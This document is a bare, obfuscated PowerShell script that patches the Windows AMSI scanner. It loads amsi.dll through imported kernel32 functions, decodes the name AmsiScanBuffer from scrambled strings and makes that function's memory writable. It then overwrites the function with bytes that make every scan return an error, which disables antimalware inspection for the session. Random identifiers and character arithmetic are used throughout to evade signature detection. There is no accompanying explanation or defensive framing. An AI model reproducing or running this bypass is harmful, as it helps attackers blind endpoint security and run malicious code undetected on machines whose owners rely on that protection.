$iDrC1TMhnd0L = @"
using System;
using System.Runtime.InteropServices;
public class iDrC1TMhnd0L {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr K8F, string eUWdOez);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr kPXDvaNftyF, UIntPtr g85D7rJ, uint nAb3BQW5NfFRownY, out uint olIqTV);
}
"@

Add-Type $iDrC1TMhnd0L

$ynj0i7ISpbZZ3JSreBQz = [iDrC1TMhnd0L]::LoadLibrary("$([ChAr]([BYTe]0x61)+[cHar]([BYTE]0x6d)+[ChAR]([bytE]0x73)+[CHar](105+83-83)+[chAr](46)+[chaR](100*25/25)+[chaR]([byte]0x6c)+[cHar](108+11-11))")
$BxbaeoaDbvw7 = [iDrC1TMhnd0L]::GetProcAddress($ynj0i7ISpbZZ3JSreBQz, "$(('ÃmsíScänBù'+'ffêr').noRMAliZe([cHAr]([byTE]0x46)+[ChaR]([ByTE]0x6f)+[ChAr](114*106/106)+[chaR]([Byte]0x6d)+[Char]([BYTE]0x44)) -replace [chAR](92*58/58)+[ChaR]([BYTE]0x70)+[cHar]([bYtE]0x7b)+[CHaR](77+67-67)+[cHar]([BYTe]0x6e)+[cHaR](125*103/103))")
$p = 0
[iDrC1TMhnd0L]::VirtualProtect($BxbaeoaDbvw7, [uint32]5, 0x40, [ref]$p)
$ofpNRN45RQJsAvUR = "0xB8"
$bE9UjtG_NKh1h8BKREqV = "0x57"
$bdgjMExicA = "0x00"
$dfLH9mR12vqTMUBou6 = "0x07"
$i_zTM7yAjRR6ya = "0x80"
$T2Lrcs7WLgonXJGrP = "0xC3"
$ZbnSW_VbKvqcbby2k = [Byte[]] ($ofpNRN45RQJsAvUR,$bE9UjtG_NKh1h8BKREqV,$bdgjMExicA,$dfLH9mR12vqTMUBou6,+$i_zTM7yAjRR6ya,+$T2Lrcs7WLgonXJGrP)
[System.Runtime.InteropServices.Marshal]::Copy($ZbnSW_VbKvqcbby2k, 0, $BxbaeoaDbvw7, 6)